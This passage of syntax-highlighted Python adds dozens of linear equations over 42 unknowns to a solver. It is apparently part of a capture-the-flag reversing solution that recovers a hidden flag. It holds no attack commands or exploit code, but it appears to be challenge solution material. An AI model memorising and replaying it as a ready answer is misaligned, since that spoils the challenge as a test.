class="number">19</span>]+l[<span class="number">21</span>]-l[<span class="number">2</span>]-l[<span class="number">33</span>]-l[<span class="number">0</span>]+l[<span class="number">39</span>]+l[<span class="number">31</span>]-l[<span class="number">23</span>]-l[<span class="number">41</span>]+l[<span class="number">38</span>]-l[<span class="number">29</span>]+l[<span class="number">36</span>]+l[<span class="number">24</span>]-l[<span class="number">20</span>]-l[<span class="number">9</span>]-l[<span class="number">32</span>]+l[<span class="number">37</span>]-l[<span class="number">35</span>]+l[<span class="number">40</span>]+l[<span class="number">7</span>]-l[<span class="number">26</span>]+l[<span class="number">15</span>]-l[<span class="number">10</span>]-l[<span class="number">6</span>]-l[<span class="number">16</span>]-l[<span class="number">4</span>]-l[<span class="number">5</span>]-l[<span class="number">30</span>]-l[<span class="number">14</span>]-l[<span class="number">22</span>]-l[<span class="number">25</span>]-l[<span class="number">34</span>]-l[<span class="number">17</span>]-l[<span class="number">11</span>]-l[<span class="number">27</span>]+l[<span class="number">1</span>]-l[<span class="number">28</span>]==-<span class="number">1068</span>)</span><br><span class="line">s.add(l[<span class="number">32</span>]+l[<span class="number">0</span>]+l[<span class="number">9</span>]+l[<span class="number">14</span>]+l[<span class="number">11</span>]+l[<span class="number">18</span>]-l[<span class="number">13</span>]+l[<span class="number">24</span>]-l[<span class="number">2</span>]-l[<span class="number">15</span>]+l[<span class="number">19</span>]-l[<span class="number">21</span>]+l[<span class="number">1</span>]+l[<span class="number">39</span>]-l[<span class="number">8</span>]-l[<span class="number">3</span>]+l[<span class="number">33</span>]+l[<span class="number">6</span>]-l[<span class="number">5</span>]-l[<span class="number">35</span>]-l[<span class="number">28</span>]+l[<span class="number">25</span>]-l[<span class="number">41</span>]+l[<span class="number">22</span>]-l[<span class="number">17</span>]+l[<span class="number">10</span>]+l[<span class="number">40</span>]+l[<span class="number">34</span>]+l[<span class="number">27</span>]-l[<span class="number">20</span>]+l[<span class="number">23</span>]+l[<span class="number">31</span>]-l[<span class="number">16</span>]+l[<span class="number">7</span>]+l[<span class="number">12</span>]-l[<span class="number">30</span>]+l[<span class="number">29</span>]-l[<span class="number">4</span>]==<span class="number">939</span>)</span><br><span class="line">s.add(l[<span class="number">19</span>]+l[<span class="number">11</span>]+l[<span class="number">20</span>]-l[<span class="number">16</span>]+l[<span class="number">40</span>]+l[<span class="number">25</span>]+l[<span class="number">1</span>]-l[<span class="number">31</span>]+l[<span class="number">28</span>]-l[<span class="number">23</span>]+l[<span class="number">14</span>]-l[<span class="number">9</span>]-l[<span class="number">27</span>]+l[<span class="number">35</span>]+l[<span class="number">39</span>]-l[<span class="number">37</span>]-l[<span class="number">8</span>]-l[<span class="number">22</span>]+l[<span class="number">5</span>]-l[<span class="number">6</span>]+l[<span class="number">0</span>]-l[<span class="number">32</span>]+l[<span class="number">24</span>]+l[<span class="number">33</span>]+l[<span class="number">29</span>]+l[<span class="number">38</span>]+l[<span class="number">15</span>]-l[<span class="number">2</span>]+l[<span class="number">30</span>]+l[<span class="number">7</span>]+l[<span class="number">12</span>]-l[<span class="number">3</span>]-l[<span class="number">17</span>]+l[<span class="number">34</span>]+l[<span class="number">41</span>]-l[<span class="number">4</span>]-l[<span class="number">13</span>]-l[<span class="number">26</span>]==<span class="number">413</span>)</span><br><span class="line">s.add(l[<span class="number">22</span>]+l[<span class="number">4</span>]-l[<span class="number">9</span>]+l[<span class="number">34</span>]+l[<span class="number">35</span>]+l[<span class="number">17</span>]+l[<span class="number">3</span>]-l[<span class="number">24</span>]+l[<span class="number">38</span>]-l[<span class="number">5</span>]-l[<span class="number">41</span>]-l[<span class="number">31</span>]-l[<span class="number">0</span>]-l[<span class="number">25</span>]+l[<span class="number">33</span>]+l[<span class="number">15</span>]-l[<span class="number">1</span>]-l[<span class="number">10</span>]+l[<span class="number">16</span>]-l[<span class="number">29</span>]-l[<span class="number">12</span>]+l[<span class="number">26</span>]-l[<span class="number">39</span>]-l[<span class="number">21</span>]-l[<span class="number">18</span>]-l[<span class="number">6</span>]-l[<span class="number">40</span>]-l[<span class="number">13</span>]+l[<span class="number">8</span>]+l[<span class="number">37</span>]+l[<span class="number">19</span>]+l[<span class="number">14</span>]+l[<span class="number">32</span>]+l[<span class="number">28</span>]-l[<span class="number">11</span>]+l[<span class="number">23</span>]+l[<span class="number">36</span>]+l[<span class="number">7</span>]==<span class="number">117</span>)</span><br><span class="line">s.add(l[<span class="number">32</span>]+l[<span class="number">16</span>]+l[<span class="number">3</span>]+l[<span class="number">11</span>]+l[<span class="number">34</span>]-l[<span class="number">31</span>]+l[<span class="number">14</span>]+l[<span class="number">25</span>]+l[<span class="number">1</span>]-l[<span class="number">30</span>]-l[<span class="number">33</span>]-l[<span class="number">40</span>]-l[<span class="number">4</span>]-l[<span class="number">29</span>]+l[<span class="number">18</span>]-l[<span class="number">27</span>]+l[<span class="number">13</span>]-l[<span class="number">19</span>]-l[<span class="number">12</span>]+l[<span class="number">23</span>]-l[<span class="number">39</span>]-l[<span class="number">41</span>]-l[<span class="number">8</span>]+l[<span class="number">22</span>]-l[<span class="number">5</span>]-l[<span class="number">38</span>]-l[<span class="number">9</span>]-l[<span class="number">37</span>]+l[<span class="number">17</span>]-l[<span class="number">36</span>]+l[<span class="number">24</span>]-l[<span class="number">21</span>]+l[<span class="number">2</span>]-l[<span class="number">26</span>]+l[<span class="number">20</span>]-l[<span class="number">7</span>]+l[<span class="number">35</span>]-l[<span class="number">0</span>]==-<span class="number">313</span>)</span><br><span class="line">s.add(l[<span class="number">40</span>]-l[<span class="number">1</span>]+l[<span class="number">5</span>]+l[<span class="number">7</span>]+l[<span class="number">33</span>]+l[<span class="number">29</span>]+l[<span class="number">12</span>]+l[<span class="number">38</span>]-l[<span class="number">31</span>]+l[<span class="number">2</span>]+l[<span class="number">14</span>]-l[<span class="number">35</span>]-l[<span class="number">8</span>]-l[<span class="number">24</span>]-l[<span class="number">39</span>]-l[<span class="number">9</span>]-l[<span class="number">28</span>]+l[<span class="number">23</span>]-l[<span class="number">17</span>]-l[<span class="number">22</span>]-l[<span class="number">26</span>]+l[<span class="number">32</span>]-l[<span class="number">11</span>]+l[<span class="number">4</span>]-l[<span class="number">36</span>]+l[<span class="number">10</span>]+l[<span class="number">20</span>]-l[<span class="number">18</span>]-l[<span class="number">16</span>]+l[<span class="number">6</span>]-l[<span class="number">0</span>]+l[<span class="number">3</span>]-l[<span class="number">30</span>]+l[<span class="number">37</span>]-l[<span class="number">19</span>]+l[<span class="number">21</span>]+l[<span class="number">25</span>]-l[<span class="number">15</span>]==-<span class="number">42</span>)</span><br><span class="line">s.add(l[<span class="number">21</span>]+l[<span class="number">26</span>]-l[<span class="number">17</span>]-l[<span class="number">25</span>]+l[<span class="number">27</span>]-l[<span class="number">22</span>]-l[<span class="number">39</span>]-l[<span class="number">23</span>]-l[<span class="number">15</span>]-l[<span class="number">20</span>]-l[<span class="number">32</span>]+l[<span class="number">12</span>]+l[<span class="number">3</span>]-l[<span class="number">6</span>]+l[<span class="number">28</span>]+l[<span class="number">31</span>]+l[<span class="number">13</span>]-l[<span class="number">16</span>]-l[<span class="number">37</span>]-l[<span class="number">30</span>]-l[<span class="number">5</span>]+l[<span class="number">41</span>]+l[<span class="number">29</span>]+l[<span class="number">36</span>]+l[<span class="number">1</span>]+l[<span class="number">11</span>]+l[<span class="number">24</span>]+l[<span class="number">18</span>]-l[<span class="number">40</span>]+l[<span class="number">19</span>]-l[<span class="number">35</span>]+l[<span class="number">2</span>]-l[<span class="number">38</span>]+l[<span class="number">14</span>]-l[<span class="number">9</span>]+l[<span class="number">4</span>]+l[<span class="number">0</span>]-l[<span class="number">33</span>]==<span class="number">289</span>)</span><br><span class="line">s.add(l[<span class="number">29</span>]+l[<span class="number">31</span>]+l[<span class="number">32</span>]-l[<span class="number">17</span>]-l[<span class="number">7</span>]+l[<span class="number">34</span>]+l[<span class="number">2</span>]+l[<span class="number">14</span>]+l[<span class="number">23</span>]-l[<span class="number">4</span>]+l[<span class="number">3</span>]+l[<span class="number">35</span>]-l[<span class="number">33</span>]-l[<span class="number">9</span>]-l[<span class="number">20</span>]-l[<span class="number">37</span>]+l[<span class="number">24</span>]-l[<span class="number">27</span>]+l[<span class="number">36</span>]+l[<span class="number">15</span>]-l[<span class="number">18</span>]-l[<span class="number">0</span>]+l[<span class="number">12</span>]+l[<span class="number">11</span>]-l[<span class="number">38</span>]+l[<span class="number">6</span>]+l[<span class="number">22</span>]+l[<span class="number">39</span>]-l[<span class="number">25</span>]-l[<span class="number">10</span>]-l[<span class="number">19</span>]-l[<span class="number">1</span>]+l[<span class="number">13</span>]-l[<span class="number">41</span>]+l[<span class="number">30</span>]-l[<span class="number">16</span>]+l[<span class="number">28</span>]-l[<span class="number">26</span>]==-<span class="number">117</span>)</span><br><span class="line">s.add(l[<span class="number">5</span>]+l[<span class="number">37</span>]-l[<span class="number">39</span>]+l[<span class="number">0</span>]-l[<span class="number">27</span>]+l[<span class="number">12</span>]+l[<span class="number">41</span>]-l[<span class="number">22</span>]+l[<span class="number">8</span>]-l[<span class="number">16</span>]-l[<span class="number">38</span>]+l[<span class="number">9</span>]+l[<span class="number">15</span>]-l[<span class="number">35</span>]-l[<span class="number">29</span>]+l[<span class="number">18</span>]+l[<span class="number">6</span>]-l[<span class="number">25</span>]-l[<span class="number">28</span>]+l[<span class="number">36</span>]+l[<span class="number">34</span>]+l[<span class="number">32</span>]-l[<span class="number">14</span>]-l[<span class="number">1</span>]+l[<span class="number">20</span>]+l[<span class="number">40</span>]-l[<span class="number">19</span>]-l[<span class="number">4</span>]-l[<span class="number">7</span>]+l[<span class="number">26</span>]+l[<span class="number">30</span>]-l[<span class="number">10</span>]+l[<span class="number">13</span>]-l[<span class="number">21</span>]+l[<span class="number">2</span>]-l[<span class="number">23</span>]-l[<span class="number">3</span>]-l[<span class="number">33</span>]==-<span class="number">252</span>)</span><br><span class="line">s.add(l[<span class="number">29</span>]+l[<span class="number">10</span>]-l[<span class="number">41</span>]-l[<span class="number">9</span>]+l[<span class="number">12</span>]-l[<span class="number">28</span>]+l[<span class="number">11</span>]+l[<span class="number">40</span>]-l[<span class="number">27</span>]-l[<span class="number">8</span>]+l[<span class="number">32</span>]-l[<span class="number">25</span>]-l[<span class="number">23</span>]+l[<span class="number">39</span>]-l[<span class="number">1</span>]-l[<span class="number">36</span>]-l[<span class="number">15</span>]+l[<span class="number">33</span>]-l[<span class="number">20</span>]+l[<span class="number">18</span>]+l[<span class="number">22</span>]-l[<span class="number">3</span>]+l[<span class="number">6</span>]-l[<span class="number">34</span>]-l[<span class="number">21</span>]+l[<span class="number">19</span>]+l[<span class="number">26</span>]+l[<span class="number">13</span>]-l[<span class="number">4</span>]+l[<span class="number">7</span>]-l[<span class="number">37</span>]+l[<span class="number">38</span>]-l[<span class="number">2</span>]-l[<span class="number">30</span>]-l[<span class="number">0</span>]-l[<span class="number">35</span>]+l[<span class="number">5</span>]+l[<span class="number">17</span>]==-<span class="number">183</span>)</span><br><span class="line">s.add(l[<span class="number">6</span>]-l[<span class="number">8</span>]-l[<span class="number">20</span>]+l[<span class="number">34</span>]-l[<span class="number">33</span>]-l[<span class="number">25</span>]-l[<span class="number">4</span>]+l[<span class="number">3</span>]+l[<span class="number">17</span>]-l[<span class="number">13</span>]-l[<span class="number">15</span>]-l[<span class="number">40</span>]+l[<span class="number">1</span>]-l[<span class="number">30</span>]-l[<span class="number">14</span>]-l[<span class="number">28</span>]-l[<span class="number">35</span>]+l[<span class="number">38</span>]-l[<span class="number">22</span>]+l[<span class="number">2</span>]+l[<span class="number">24</span>]-l[<span class="number">29</span>]+l[<span class="number">5</span>]+l[<span class="number">9</span>]+l[<span class="number">37</span>]+l[<span class="number">23</span>]-l[<span class="number">18</span>]+l[<span class="number">19</span>]-l[<span class="number">21</span>]+l[<span class="number">11</span>]+l[<span class="number">36</span>]+l[<span class="number">41</span>]-l[<span class="number">7</span>]-l[<span class="number">32</span>]+l[<span class="number">10</span>]+l[<span class="number">26</span>]-l[<span class="number">0</span>]+l[<span class="number">31</span>]==<span class="number">188</span>)</span><br><span class="line">s.add(l[<span class="number">3</span>]+l[<span class="number">6</span>]-l[<span class="number">41</span>]+l[<span class="number">10</span>]+l[<span class="number">39</span>]+l[<span class="number">37</span>]+l[<span class="number">1</span>]+l[<span class="number">8</span>]+l[<span class="number">21</span>]+l[<span class="number">24</span>]+l[<span class="number">29</span>]+l[<span class="number">12</span>]+l[<span class="number">27</span>]-l[<span class="number">38</span>]+l[<span class="number">11</span>]+l[<span class="number">23</span>]+l[<span class="number">28</span>]+l[<span class="number">33</span>]-l[<span class="number">31</span>]+l[<span class="number">14</span>]-l[<span class="number">5</span>]+l[<span class="number">32</span>]-l[<span class="number">17</span>]+l[<span class="number">40</span>]-l[<span class="number">34</span>]+l[<span class="number">20</span>]-l[<span class="number">22</span>]-l[<span class="number">16</span>]+l[<span class="number">19</span>]+l[<span class="number">2</span>]-l[<span class="number">36</span>]-l[<span class="number">7</span>]+l[<span class="number">18</span>]+l[<span class="number">15</span>]+l[<span class="number">26</span>]-l[<span class="number">0</span>]-l[<span class="number">4</span>]+l[<span class="number">35</span>]==<span class="number">1036</span>)</span><br><span class="line">s.add(l[<span class="number">28</span>]-l[<span class="number">33</span>]+l[<span class="number">2</span>]+l[<span class="number">37</span>]-l[<span class="number">12</span>]-l[<span class="number">9</span>]-l[<span class="number">39</span>]+l[<span class="number">16</span>]-l[<span class="number">32</span>]+l[<span class="number">8</span>]-l[<span class="number">36</span>]+l[<span class="number">31</span>]+l[<span class="number">10</span>]-l[<span class="number">4</span>]+l[<span class="number">21</span>]-l[<span class="number">25</span>]+l[<span class="number">18</span>]+l[<span class="number">24</span>]-l[<span class="number">0</span>]+l[<span class="number">29</span>]-l[<span class="number">26</span>]+l[<span class="number">35</span>]-l[<span class="number">22</span>]-l[<span class="number">41</span>]-l[<span class="number">6</span>]+l[<span class="number">15</span>]+l[<span class="number">19</span>]+l[<span class="number">40</span>]+l[<span class="number">7</span>]+l[<span class="number">34</span>]+l[<span class="number">17</span>]-l[<span class="number">3</span>]-l[<span class="number">13</span>]+l[<span class="number">5</span>]+l[<span class="number">23</span>]+l[<span class="number">11</span>]-l[<span class="number">27</span>]+l[<span class="number">1</span>]==<span class="number">328</span>)</span><br><span class="line">s.add(l[<span class="number">22</span>]-l[<span class="number">32</span>]+l[<span class="number">17</span>]-l[<span class="number">9</span>]+l[<span class="number">20</span>]-l[<span class="number">18</span>]-l[<span class="number">34</span>]+l[<span class="number">23</span>]+l[<span class="number">36</span>]-l[<span class="number">35</span>]-l[<span class="number">38</span>]+l[<span class="number">27</span>]+l[<span class="number">4</span>]-l[<span class="number">5</span>]-l[<span class="number">41</span>]+l[<span class="number">29</span>]+l[<span class="number">33</span>]+l[<span class="number">0</span>]-l[<span class="number">37</span>]+l[<span class="number">28</span>]-l[<span class="number">40</span>]-l[<span class="number">11</span>]-l[<span class="number">12</span>]+l[<span class="number">7</span>]+l[<span class="number">1</span>]+l[<span class="number">2</span>]-l[<span class="number">26</span>]-l[<span class="number">16</span>]-l[<span class="number">8</span>]+l[<span class="number">24</span>]-l[<span class="number">25</span>]+l[<span class="number">3</span>]-l[<span class="number">6</span>]-l[<span class="number">19</span>]-l[<span class="number">39</span>]-l[<span class="number">14</span>]-l[<span class="number">31</span>]+l[<span class="number">10</span>]==-<span class="number">196</span>)</span><br><span class="line">s.add(l[<span class="number">11</span>]+l[<span class="number">13</span>]+l[<span class="number">14</span>]-l[<span class="number">15</span>]-l[<span class="number">29</span>]-l[<span class="number">2</span>]+l[<span class="number">7</span>]+l[<span class="number">20</span>]+l[<span class="number">30</span>]-l[<span class="number">36</span>]-l[<span class="number">33</span>]-l[<span class="number">19</span>]+l[<span class="number">31</span>]+l[<span class="number">0</span>]-l[<span class="number">39</span>]-l[<span class="number">4</span>]-l[<span class="number">6</span>]+l[<span class="number">38</span>]+l[<span class="number">35</span>]-l[<span class="number">28</span>]+l[<span class="number">34</span>]-l[<span class="number">9</span>]-l[<span class="number">23</span>]-l[<span class="number">26</span>]+l[<span class="number">37</span>]-l[<span class="number">8</span>]-l[<span class="number">27</span>]+l[<span class="number">5</span>]-l[<span class="number">41</span>]+l[<span class="number">3</span>]+l[<span class="number">17</span>]+l[<span class="number">40</span>]-l[<span class="number">10</span>]+l[<span class="number">25</span>]+l[<span class="number">12</span>]-l[<span class="number">24</span>]+l[<span class="number">18</span>]+l[<span class="number">32</span>]==<span class="number">7</span>)</span><br><span class="line">s.add(l[<span class="number">34</span>]-l[<span class="number">37</span>]-l[<span class="number">40</span>]+l[<span class="number">4</span>]-l[<span class="number">22</span>]-l[<span class="number">31</span>]-l[<span class="number">6</span>]+l[<span class="number">38</span>]+l[<span class="number">13</span>]-l[<span class="number">28</span>]+l[<span class="number">8</span>]+l[<span class="number">30</span>]-l[<span class="number">20</span>]-l[<span class="number">7</span>]-l[<span class="number">32</span>]+l[<span class="number">26</span>]+l[<span class="number">1</span>]-l[<span class="number">18</span>]+l[<span class="number">5</span>]+l[<span class="number">35</span>]-l[<span class="number">24</span>]-l[<span class="number">41</span>]+l[<span class="number">9</span>]-l[<span class="number">0</span>]-l[<span class="number">2</span>]-l[<span class="number">15</span>]-l[<span class="number">10</span>]+l[<span class="number">12</span>]-l[<span class="number">36</span>]+l[<span class="number">33</span>]-l[<span class="number">16</span>]-l[<span class="number">14</span>]-l[<span class="number">25</span>]-l[<span class="number">29</span>]-l[<span class="number">21</span>]+l[<span class="number">27</span>]+l[<span class="number">3</span>]-l[<span class="number">17</span>]==-<span class="number">945</span>)</span><br><span class="line">s.add(l[<span class="number">12</span>]-l[<span class="number">30</span>]-l[<span class="number">8</span>]+l[<span class="number">20</span>]-l[<span class="number">2</span>]-l[<span class="number">36</span>]-l[<span class="number">25</span>]-l[<span class="number">0</span>]-l[<span class="number">19</span>]-l[<span class="number">28</span>]-l[<span class="number">7</span>]-l[<span class="number">11</span>]-l[<span class="number">33</span>]+l[<span class="number">4</span>]-l[<span class="number">23</span>]+l[<span class="number">10</span>]-l[<span class="number">41</span>]+l[<span class="number">39</span>]-l[<span class="number">32</span>]+l[<span class="number">27</span>]+l[<span class="number">18</span>]+l[<span class="number">15</span>]+l[<span class="number">34</span>]+l[<span class="number">13</span>]-l[<span class="number">40</span>]+l[<span class="number">29</span>]-l[<span class="number">6</span>]+l[<span class="number">37</span>]-l[<span class="number">14</span>]-l[<span class="number">16</span>]+l[<span class="number">38</span>]-l[<span class="number">26</span>]+l[<span class="number">17</span>]+l[<span class="number">31</span>]-l[<span class="number">22</span>]-l[<span class="number">35</span>]+l[<span class="number">5</span>]-l[<span class="number">1</span>]==-<span class="number">480</span>)</span><br><span class="line">s.add(l[<span class="number">36</span>]-l[<span class="number">11</span>]-l[<span class="number">34</span>]+l[<span class="number">8</span>]+l[<span class="number">0</span>]+l[<span class="number">15</span>]+l[<span class="number">28</span>]-l[<span class="number">39</span>]-l[<span class="number">32</span>]-l[<span class="number">2</span>]-l[<span class="number">27</span>]+l[<span class="number">22</span>]+l[<span class="number">16</span>]-l[<span class="number">30</span>]-l[<span class="number">3</span>]+l[<span class="number">31</span>]-l[<span class="number">26</span>]+l[<span class="number">20</span>]+l[<span class="number">17</span>]-l[<span class="number">29</span>]-l[<span class="number">18</span>]+l[<span class="number">19</span>]-l[<span class="number">10</span>]+l[<span class="number">6</span>]-l[<span class="number">5</span>]-l[<span class="number">38</span>]-l[<span class="number">25</span>]-l[<span class="number">24</span>]+l[<span class="number">4</span>]+l[<span class="number">23</span>]+l[<span class="number">9</span>]+l[<span class="number">14</span>]+l[<span class="number">21</span>]-l[<span class="number">37</span>]+l[<span class="number">13</span>]-l[<span class="number">41</span>]-l[<span class="number">12</span>]+l[<span class="number">35</span>]==-<span class="number">213</span>)</span><br><span class="line">s.add(l[<span class="number">19</span>]-l[<span class="number">36</span>]-l[<span class="number">12</span>]+l[<span class="number">33</span>]-l[<span class="number">27</span>]-l[<span class="number">37</span>]-l[<span class="number">25</span>]+l[<span class="number">38</span>]+l[<span class="number">16</span>]-l[<span class="number">18</span>]+l[<span class="number">22</span>]-l[<span class="number">39</span>]+l[<span class="number">13</span>]-l[<span class="number">7</span>]-l[<span class="number">31</span>]-l[<span class="number">26</span>]+l[<span class="number">15</span>]-l[<span class="number">10</span>]-l[<span class="number">9</span>]-l[<span class="number">2</span>]-l[<span class="number">30</span>]-l[<span class="number">11</span>]+l[<span class="number">41</span>]-l[<span class="number">4</span>]+l[<span class="number">24</span>]+l[<span class="number">34</span>]+l[<span class="number">5</span>]+l[<span class="number">17</span>]+l[<span class="number">14</span>]+l[<span class="number">6</span>]+l[<span class="number">8</span>]-l[<span class="number">21</span>]-l[<span class="number">23</span>]+l[<span class="number">32</span>]-l[<span class="number">1</span>]-l[<span class="number">29</span>]-l[<span class="number">0</span>]+l[<span class="number">3</span>]==-<span class="number">386</span>)</span><br><span class="line">s.add(l[<span class="number">0</span>]+l[<span class="number">7</span>]-l[<span class="number">28</span>]-l[<span class="number">38</span>]+l[<span class="number">19</span>]+l[<span class="number">31</span>]-l[<span class="number">5</span>]+l[<span class="number">24</span>]-l[<span class="number">3</span>]+l[<span class="number">33</span>]-l[<span class="number">12</span>]-l[<span class="number">29</span>]+l[<span class="number">32</span>]+l[<span class="number">1</span>]-l[<span class="number">34</span>]-l[<span class="number">9</span>]-l[<span class="number">25</span>]+l[<span class="number">26</span>]-l[<span class="number">8</span>]+l[<span class="number">4</span>]-l[<span class="number">10</span>]+l[<span class="number">40</span>]-l[<span class="number">15</span>]-l[<span class="number">11</span>]-l[<span class="number">27</span>]+l[<span class="number">36</span>]+l[<span class="number">14</span>]+l[<span class="number">41</span>]-l[<span class="number">35</span>]-l[<span class="number">13</span>]-l[<span class="number">17</span>]-l[<span class="number">21</span>]-l[<span class="number">18</span>]+l[<span class="number">39</span>]-l[<span class="number">2</span>]+l[<span class="number">20</span>]-l[<span class="number">23</span>]-l[<span class="number">22</span>]==-<span class="number">349</span>)</span><br><span class="line">s.add(l[<span class="number">10</span>]+l[<span class="number">22</span>]+l[<span class="number">21</span>]-l[<span class="number">0</span>]+l[<span class="number">15</span>]-l[<span class="number">6</span>]+l[<span class="number">20</span>]-l[<span class="number">29</span>]-l[<span class="number">30</span>]-l[<span class="number">33</span>]+l[<span class="number">19</span>]+l[<span class="number">23</span>]-l[<span class="number">28</span>]+l[<span class="number">41</span>]-l[<span class="number">27</span>]-l[<span class="number">12</span>]-l[<span class="number">37</span>]-l[<span class="number">32</span>]+l[<span class="number">34</span>]-l[<span class="number">36</span>]+l[<span class="number">3</span>]+l[<span class="number">1</span>]-l[<span class="number">13</span>]+l[<span class="number">18</span>]+l[<span class="number">14</span>]+l[<span class="number">9</span>]+l[<span class="number">7</span>]-l[<span class="number">39</span>]+l[<span class="number">8</span>]+l[<span class="number">2</span>]-l[<span class="number">31</span>]-l[<span class="number">5</span>]-l[<span class="number">40</span>]+l[<span class="number">38</span>]-l[<span class="number">26</span>]-l[<span class="number">4</span>]+l[<span class="number">16</span>]-l[<span class="number">25</span>]==<span class="number">98</span>)</span><br><span class="line">s.add(l[<span class="number">28</span>]+l[<span class="number">38</span>]+l[<span class="number">20</span>]+l[<span class="number">0</span>]-l[<span class="number">5</span>]-l[<span class="number">34</span>]-l[<span class="number">41</span>]+l[<span class="number">22</span>]-l[<span class="number">26</span>]+l[<span class="number">11</span>]+l[<span class="number">29</span>]+l[<span class="number">31</span>]-l[<span class="number">3</span>]-l[<span class="number">16</span>]+l[<span class="number">23</span>]+l[<span class="number">17</span>]-l[<span class="number">18</span>]+l[<span class="number">9</span>]-l[<span class="number">4</span>]-l[<span class="number">12</span>]-l[<span class="number">19</span>]-l[<span class="number">40</span>]-l[<span class="number">27</span>]+l[<span class="number">33</span>]+l[<span class="number">8</span>]-l[<span class="number">37</span>]+l[<span class="number">2</span>]+l[<span class="number">15</span>]-l[<span class="number">24</span>]-l[<span class="number">39</span>]+l[<span class="number">10</span>]+l[<span class="number">35</span>]-l[<span class="number">1</span>]+l[<span class="number">30</span>]-l[<span class="number">36</span>]-l[<span class="number">25</span>]-l[<span class="number">14</span>]-l[<span class="number">32</span>]==-<span class="number">412</span>)</span><br><span class="line">s.add(l[<span class="number">1</span>]-l[<span class="number">24</span>]-l[<span class="number">29</span>]+l[<span class="number">39</span>]+l[<span class="number">41</span>]+l[<span class="number">0</span>]+l[<span class="number">9</span>]-l[<span class="number">19</span>]+l[<span class="number">6</span>]-l[<span class="number">37</span>]-l[<span class="number">22</span>]+l[<span class="number">32</span>]+l[<span class="number">21</span>]+l[<span class="number">28</span>]+l[<span class="number">36</span>]+l[<span class="number">4</span>]-l[<span class="number">17</span>]+l[<span class="number">20</span>]-l[<span class="number">13</span>]-l[<span class="number">35</span>]-l[<span class="number">5</span>]+l[<span class="number">33</span>]-l[<span class="number">27</span>]-l[<span class="number">30</span>]+l[<span class="number">40</span>]+l[<span class="number">25</span>]-l[<span class="number">18</span>]+l[<span class="number">34</span>]-l[<span class="number">3</span>]-l[<span class="number">10</span>]-l[<span class="number">16</span>]-l[<span class="number">23</span>]-l[<span class="number">38</span>]+l[<span class="number">8</span>]-l[<span class="number">14</span>]-l[<span class="number">11</span>]-l[<span class="number">7</span>]+l[<span class="number">12</span>]==-<span class="number">95</span>)</span><br><span class="line">s.add(l[<span class="number">2</span>]-l[<span class="number">24</span>]+l[<span class="number">31</span>]+l[<span class="number">0</span>]+l[<span class="number">9</span>]-l[<span class="number">6</span>]+l[<span class="number">7</span>]-l[<span class="number">1</span>]-l[<span class="number">22</span>]+l[<span class="number">8</span>]-l[<span class="number">23</span>]+l[<span class="number">40</span>]+l[<span class="number">20</span>]-l[<span class="number">38</span>]-l[<span class="number">11</span>]-l[<span class="number">14</span>]+l[<span class="number">18</span>]-l[<span class="number">36</span>]+l[<span class="number">15</span>]-l[<span class="number">4</span>]-l[<span class="number">41</span>]-l[<span class="number">12</span>]-l[<span class="number">34</span>]+l[<span class="number">32</span>]-l[<span class="number">35</span>]+l[<span class="number">17</span>]-l[<span class="number">21</span>]-l[<span class="number">10</span>]-l[<span class="number">29</span>]+l[<span class="number">39</span>]-l[<span class="number">16</span>]+l[<span class="number">27</span>]+l[<span class="number">26</span>]-l[<span class="number">3</span>]-l[<span class="number">5</span>]+l[<span class="number">13</span>]+l[<span class="number">25</span>]-l[<span class="number">28</span>]==-<span class="number">379</span>)</span><br><span class="line">s.add(l[<span class="number">19</span>]-l[<span class="number">17</span>]+l[<span class="number">31</span>]+l[<span class="number">14</span>]+l[<span class="number">6</span>]-l[<span class="number">12</span>]+l[<span class="number">16</span>]-l[<span class="number">8</span>]+l[<span class="number">27</span>]-l[<span class="number">13</span>]+l[<span class="number">41</span>]+l[<span class="number">2</span>]-l[<span class="number">7</span>]+l[<span class="number">32</span>]+l[<span class="number">1</span>]+l[<span class="number">25</span>]-l[<span class="number">9</span>]+l[<span class="number">37</span>]+l[<span class="number">34</span>]-l[<span class="number">18</span>]-l[<span class="number">40</span>]-l[<span class="number">11</span>]-l[<span class="number">10</span>]+l[<span class="number">38</span>]+l[<span class="number">21</span>]+l[<span class="number">3</span>]-l[<span class="number">0</span>]+l[<span class="number">24</span>]+l[<span class="number">15</span>]+l[<span class="number">23</span>]-l[<span class="number">20</span>]+l[<span class="number">26</span>]+l[<span class="number">22</span>]-l[<span class="number">4</span>]-l[<span class="number">28</span>]-l[<span class="number">5</span>]+l[<span class="number">39</span>]+l[<span class="number">35</span>]==<span class="number">861</span>)</span><br><span class="line">s.add(l[<span class="number">35</span>]+l[<span class="number">36</span>]-l[<span class="number">16</span>]-l[<span class="number">26</span>]-l[<span class="number">31</span>]+l[<span class="number">0</span>]+l[<span class="number">21</span>]-l[<span class="number">13</span>]+l[<span class="number">14</span>]+l[<span class="number">39</span>]+l[<span class="number">7</span>]+l[<span class="number">4</span>]+l[<span class="number">34</span>]+l[<span class="number">38</span>]+l[<span class="number">17</span>]+l[<span class="number">22</span>]+l[<span class="number">32</span>]+l[<span class="number">5</span>]+l[<span class="number">15</span>]+l[<span class="number">8</span>]-l[<span class="number">29</span>]+l[<span class="number">40</span>]+l[<span class="number">24</span>]+l[<span class="number">6</span>]+l[<span class="number">30</span>]-l[<span class="number">2</span>]+l[<span class="number">25</span>]+l[<span class="number">23</span>]+l[<span class="number">1</span>]+l[<span class="number">12</span>]+l[<span class="number">9</span>]-l[<span class="number">10</span>]-l[<span class="number">3</span>]-l[<span class="number">19</span>]+l[<span class="number">20</span>]-l[<span class="number">37</span>]-l[<span class="number">33</span>]-l[<span class="number">18</span>]==<span class="number">1169</span>)</span><br><span class="line">s.add(l[<span class="number">13</span>]+l[<span class="number">0</span>]-l[<span class="number">25</span>]-l[<span class="number">32</span>]-l[<span class="number">21</span>]-l[<span class="number">34</span>]-l[<span class="number">14</span>]-l[<span class="number">9</span>]-l[<span class="number">8</span>]-l[<span class="number">15</span>]-l[<span class="number">16</span>]+l[<span class="number">38</span>]-l[<span class="number">35</span>]-l[<span class="number">30</span>]-l[<span class="number">40</span>]-l[<span class="number">12</span>]+l[<span class="number">3</span>]-l[<span class="number">19</span>]+l[<span class="number">4</span>]-l[<span class="number">41</span>]+l[<span class="number">2</span>]-l[<span class="number">36</span>]+l[<span class="number">37</span>]+l[<span class="number">17</span>]-l[<span class="number">1</span>]+l[<span class="number">26</span>]-l[<span class="number">39</span>]-l[<span class="number">10</span>]-l[<span class="number">33</span>]+l[<span class="number">5</span>]-l[<span class="number">27</span>]-l[<span class="number">23</span>]-l[<span class="number">24</span>]-l[<span class="number">7</span>]+l[<span class="number">31</span>]-l[<span class="number">28</span>]-l[<span 